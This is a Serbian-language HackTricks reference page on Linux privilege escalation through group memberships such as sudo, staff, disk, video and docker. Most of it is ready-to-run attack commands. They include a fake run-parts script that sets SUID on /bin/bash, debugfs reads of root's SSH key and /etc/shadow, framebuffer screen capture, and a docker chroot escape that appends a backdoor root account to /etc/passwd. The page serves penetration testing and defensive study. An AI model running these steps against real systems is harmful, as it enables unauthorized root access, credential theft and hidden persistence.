# Interesting Groups - Linux Privesc

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Sudo/Admin Grupa

### **PE - Metoda 1**

**Ponekad**, **po podrazumevanim postavkama (ili zato što neki softver to zahteva)** unutar datoteke **/etc/sudoers** možete pronaći neke od ovih linija:

```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```

Ovo znači da **svaki korisnik koji pripada grupi sudo ili admin može izvršiti bilo šta kao sudo**.

Ako je to slučaj, da **postanete root možete jednostavno izvršiti**:

```
sudo su
```

### PE - Metoda 2

Pronađite sve suid binarne datoteke i proverite da li postoji binarna datoteka **Pkexec**:

```bash
find / -perm -4000 2>/dev/null
```

Ako otkrijete da je binarni **pkexec SUID binarni** i pripadate grupama **sudo** ili **admin**, verovatno možete izvršiti binarne datoteke kao sudo koristeći `pkexec`.\
To je zato što su obično to grupe unutar **polkit politike**. Ova politika u osnovi identifikuje koje grupe mogu koristiti `pkexec`. Proverite to sa:

```bash
cat /etc/polkit-1/localauthority.conf.d/*
```

Ovde ćete pronaći koje grupe imaju dozvolu da izvrše **pkexec** i **podrazumevano** u nekim Linux distribucijama se pojavljuju grupe **sudo** i **admin**.

Za **postati root možete izvršiti**:

```bash
pkexec "/bin/sh" #You will be prompted for your user password
```

Ako pokušate da izvršite **pkexec** i dobijete ovu **grešku**:

```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```

**Nije zato što nemate dozvole već zato što niste povezani bez grafičkog korisničkog interfejsa**. Postoji način da se reši ovaj problem ovde: [https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903). Potrebne su vam **2 različite ssh sesije**:

{% code title="sesija1" %}
```bash
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```
{% endcode %}

{% code title="sesija2" %}
```bash
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
{% endcode %}

## Wheel Group

**Ponekad**, **po podrazumevanim postavkama** unutar datoteke **/etc/sudoers** možete pronaći ovu liniju:

```
%wheel	ALL=(ALL:ALL) ALL
```

Ovo znači da **svaki korisnik koji pripada grupi wheel može izvršiti bilo šta kao sudo**.

Ako je to slučaj, da **postanete root možete jednostavno izvršiti**:

```
sudo su
```

## Shadow grupa

Korisnici iz **shadow grupe** mogu **čitati** fajl **/etc/shadow**:

```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```

## Grupa Osoblje

**osoblje**: Omogućava korisnicima da dodaju lokalne modifikacije na sistemu (`/usr/local`) bez potrebe za privilegijama root korisnika (napomena da izvršni fajlovi u `/usr/local/bin` su u PATH varijabli svakog korisnika, i mogu "zameniti" izvršne fajlove u `/bin` i `/usr/bin` sa istim imenom). Uporedite sa grupom "adm", koja je više povezana sa nadgledanjem/bezbednošću. [\[izvor\]](https://wiki.debian.org/SystemGroups)

U debian distribucijama, `$PATH` varijabla pokazuje da će `/usr/local/` biti pokrenut sa najvišim prioritetom, bez obzira da li ste privilegovani korisnik ili ne.

```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Ako možemo preuzeti kontrolu nad nekim programima u `/usr/local`, lako možemo dobiti root pristup.

Preuzimanje kontrole nad programom `run-parts` je jedan od načina za lako dobijanje root pristupa, jer će većina programa pokrenuti `run-parts` (kao što su crontab, prilikom SSH prijave).

```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```

ili kada se prijavi nova ssh sesija.

```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```

**Iskoristi**

```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```

## Disk Grupa

Ova privilegija je skoro **ekvivalentna pristupu kao root** jer omogućava pristup svim podacima unutar mašine.

Fajlovi: `/dev/sd[a-z][1-9]`

```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```

Imajte na umu da pomoću debugfs-a takođe možete **pisati datoteke**. Na primer, da biste kopirali `/tmp/asd1.txt` u `/tmp/asd2.txt`, možete uraditi:

```bash
debugfs -w /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```

Međutim, ako pokušate **pisati datoteke koje su u vlasništvu root-a** (poput `/etc/shadow` ili `/etc/passwd`), dobićete "**Permission denied**" grešku.

## Video Grupa

Korišćenjem komande `w` možete saznati **ko je prijavljen na sistemu** i prikazaće izlaz poput sledećeg:

```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```

**tty1** znači da je korisnik **yossi fizički prijavljen** na terminal na mašini.

Grupa **video** ima pristup za pregled ekranskog izlaza. U osnovi, možete posmatrati ekrane. Da biste to uradili, treba da **uhvatite trenutnu sliku ekrana** u sirovim podacima i dobijete rezoluciju koju ekran koristi. Podaci ekrana mogu biti sačuvani u `/dev/fb0`, a rezoluciju ovog ekrana možete pronaći na `/sys/class/graphics/fb0/virtual_size`.

```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```

Da biste **otvorili** **sirovu sliku**, možete koristiti **GIMP**, izaberite datoteku \*\*`screen.raw` \*\* i izaberite kao tip datoteke **Podaci o sirovoj slici**:

![](<../../../.gitbook/assets/image (287) (1).png>)

Zatim promenite Širinu i Visinu na one koje su korišćene na ekranu i proverite različite Tipove slika (i izaberite onaj koji najbolje prikazuje ekran):

![](<../../../.gitbook/assets/image (288).png>)

## Root Grupa

Izgleda da **članovi root grupe** po podrazumevanim postavkama mogu imati pristup **modifikovanju** nekih **konfiguracionih datoteka servisa** ili nekih **biblioteka** ili **drugih interesantnih stvari** koje bi mogle biti korišćene za eskalaciju privilegija...

**Proverite koje datoteke članovi root grupe mogu modifikovati**:

```bash
find / -group root -perm -g=w 2>/dev/null
```

## Docker grupa

Možete **montirati korenski fajl sistem glavne mašine na volumen instance**, tako da kada se instanca pokrene, odmah učitava `chroot` u taj volumen. Ovo vam efektivno daje root pristup mašini.

```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bashbash
```

## Pokretanje privilegovanog kontejnera i bekstvo iz njega

Ako vam se ne sviđaju prethodni predlozi ili iz nekog razloga ne funkcionišu (npr. docker api firewall?), uvek možete pokušati da **pokrenete privilegovan kontejner i pobegnete iz njega** kako je objašnjeno ovde:

{% content-ref url="../docker-security/" %}
[docker-security](../docker-security/)
{% endcontent-ref %}

Ako imate dozvole za pisanje nad docker socket-om, pročitajte [**ovaj post o tome kako eskalirati privilegije zloupotrebom docker socketa**](../#writable-docker-socket)**.**

{% embed url="https://github.com/KrustyHack/docker-privilege-escalation" %}

{% embed url="https://fosterelli.co/privilege-escalation-via-docker.html" %}

## Grupa lxc/lxd

{% content-ref url="./" %}
[.](./)
{% endcontent-ref %}

## Grupa Adm

Obično **članovi** grupe **`adm`** imaju dozvole za **čitanje log** fajlova koji se nalaze unutar _/var/log/_.\
Stoga, ako ste kompromitovali korisnika unutar ove grupe, definitivno treba da **pogledate logove**.

## Grupa Auth

Unutar OpenBSD-a, grupa **auth** obično može pisati u folderima _**/etc/skey**_ i _**/var/db/yubikey**_ ako se koriste.\
Ove dozvole mogu biti zloupotrebljene pomoću sledećeg eksploita za **escalaciju privilegija** na root: [https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
